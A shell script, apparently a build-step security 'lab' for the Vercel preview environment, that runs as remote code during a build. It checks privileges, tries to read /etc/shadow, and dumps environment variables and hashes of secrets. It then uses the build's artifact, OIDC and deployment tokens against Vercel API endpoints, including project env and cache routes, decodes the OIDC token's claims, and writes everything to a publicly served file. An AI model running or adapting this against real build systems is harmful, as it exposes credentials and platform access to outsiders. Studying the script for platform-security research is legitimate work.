#!/bin/sh
mkdir -p public
echo '<h1>Vercel preview lab</h1><p><a href="/rce.txt">/rce.txt</a></p>' > public/index.html
{
  echo "== who am i =="
  id
  uname -a
  echo "== real root or emulated =="
  echo "FAKEROOTKEY=${FAKEROOTKEY:-ABSENT}"
  grep -E '^(Uid|Gid|CapEff|Seccomp):' /proc/self/status
  echo -n "write to /root: "
  (touch /root/.lab-write-test && echo OK) || echo DENIED
  echo -n "read /etc/shadow: "
  (head -c 1 /etc/shadow >/dev/null 2>&1 && echo READABLE) || echo DENIED
  echo "== nonce =="
  echo "LAB-NONCE: CANARY-8336db7bc74b6183"
  echo "== plaintext canaries (deliberate, throwaway) =="
  echo "VERCEL_ENV=${VERCEL_ENV:-unset}"
  echo "VERCEL_PROJECT_ID=${VERCEL_PROJECT_ID:-unset}"
  echo "LAB_CANARY_A=${LAB_CANARY_A:-unset}"
  echo "LAB_CANARY_B=${LAB_CANARY_B:-unset}"
  echo "LAB_CANARY_C=${LAB_CANARY_C:-unset}"
  echo "LAB_PROD_ONLY=${LAB_PROD_ONLY:-unset}   (set with target=production only)"
  echo "== secret-looking values: length + sha256 prefix (raw not published) =="
  env | sort | while IFS='=' read -r k v; do
    case "$k" in
      *_TOKEN*|*_KEY*|*_SECRET*|*AUTH*|*PASS*|*CRED*|*ENCRYPTED*|*RUNTIME_CACHE*|TURBO_*|*ARTIFACT*|*S3*)
        h=$(printf '%s' "$v" | sha256sum | cut -c1-16)
        echo "$k len=${#v} sha256=$h" ;;
    esac
  done
  echo "== platform endpoints (not secret) =="
  echo "VERCEL_API_ENDPOINT=${VERCEL_API_ENDPOINT:-unset}"
  echo "VERCEL_API_BUILD_CONTAINERS_ENDPOINT=${VERCEL_API_BUILD_CONTAINERS_ENDPOINT:-unset}"
  echo "VERCEL_ARTIFACTS_OWNER=${VERCEL_ARTIFACTS_OWNER:-unset}"
  echo "VERCEL_CLUSTER=${VERCEL_CLUSTER:-unset}"
  echo "VERCEL_BUILD_PROVIDER=${VERCEL_BUILD_PROVIDER:-unset}"
  echo "VERCEL_BUILD_IMAGE=${VERCEL_BUILD_IMAGE:-unset}"
  echo "RUNTIME_CACHE_ENDPOINT=${RUNTIME_CACHE_ENDPOINT:-unset}"
  echo "TURBO_CACHE=${TURBO_CACHE:-unset} TURBO_REMOTE_ONLY=${TURBO_REMOTE_ONLY:-unset}"
  echo "== total exported vars =="
  env | wc -l
} > public/rce.txt
node -e '
const tok = (n) => process.env[n] || "";
const ep = process.env.VERCEL_API_ENDPOINT || "https://api.vercel.com";
const pid = process.env.VERCEL_PROJECT_ID || "";
const oid = process.env.VERCEL_ARTIFACTS_OWNER || "";
const did = process.env.VERCEL_DEPLOYMENT_ID || "";
const out = [];
async function probe(label, url, bearer) {
  const h = bearer ? { Authorization: "Bearer " + bearer } : {};
  try {
    const r = await fetch(url, { headers: h });
    let body = "";
    try { body = (await r.text()).slice(0, 120); } catch (e) {}
    out.push(label + " -> HTTP " + r.status + (body ? " | " + body.replace(/\n/g, " ") : ""));
  } catch (e) {
    out.push(label + " -> ERR " + String(e.message).slice(0, 60));
  }
}
(async () => {
  out.push("== egress + API reachability ==");
  await probe("api.vercel.com/v1/user (no auth)", ep + "/v1/user", null);
  await probe("project (no auth)", ep + "/v10/projects/" + pid, null);
  await probe("project (ARTIFACTS_TOKEN)", ep + "/v10/projects/" + pid, tok("VERCEL_ARTIFACTS_TOKEN"));
  await probe("project (OIDC_TOKEN)", ep + "/v10/projects/" + pid, tok("VERCEL_OIDC_TOKEN"));
  await probe("project (DEPLOYMENT_KEY)", ep + "/v10/projects/" + pid, tok("VERCEL_DEPLOYMENT_KEY"));
  await probe("user (ARTIFACTS_TOKEN)", ep + "/v1/user", tok("VERCEL_ARTIFACTS_TOKEN"));
  await probe("user (OIDC_TOKEN)", ep + "/v1/user", tok("VERCEL_OIDC_TOKEN"));
  out.push("== candidate cache / artifact endpoints ==");
  const cands = [
    "/v3/artifacts/" + oid + "/" + did,
    "/v8/artifacts/" + did,
    "/v3/artifacts/" + oid,
    "/v9/artifacts/" + oid,
    "/turbo/remote-cache/" + oid,
    "/v3/remote-cache/" + oid,
    "/v13/deployments/" + did,
    "/v10/projects/" + pid + "/env",
    "/v7/projects/" + pid + "/env",
    "/v10/projects/" + pid + "/cache",
  ];
  for (const c of cands) {
    await probe("GET " + c + " (ARTIFACTS)", ep + c, tok("VERCEL_ARTIFACTS_TOKEN"));
  }
  out.push("== OIDC token claims (decoded, no signature) ==");
  const t = tok("VERCEL_OIDC_TOKEN");
  if (t) {
    try {
      const p = JSON.parse(Buffer.from(t.split(".")[1], "base64").toString("utf8"));
      for (const k of Object.keys(p).sort()) {
        const v = String(p[k]);
        out.push("  " + k + " = " + (v.length > 90 ? v.slice(0, 90) + "..." : v));
      }
    } catch (e) { out.push("  decode failed: " + e.message); }
  } else { out.push("  (no OIDC token in env)"); }
  out.push("== encrypted env blob ==");
  out.push("VERCEL_ENCRYPTED_ENV_CONTENT len=" + (tok("VERCEL_ENCRYPTED_ENV_CONTENT") || "").length);
  out.push("VERCEL_ENV_ENC_KEY len=" + (tok("VERCEL_ENV_ENC_KEY") || "").length);
  out.push("VERCEL_ENCRYPTED_ENV_FILENAME=" + (process.env.VERCEL_ENCRYPTED_ENV_FILENAME || "unset"));
  require("fs").appendFileSync("public/rce.txt", "\n" + out.join("\n") + "\n");
})();
' 2>> public/rce.txt
sleep 6
cat public/rce.txt
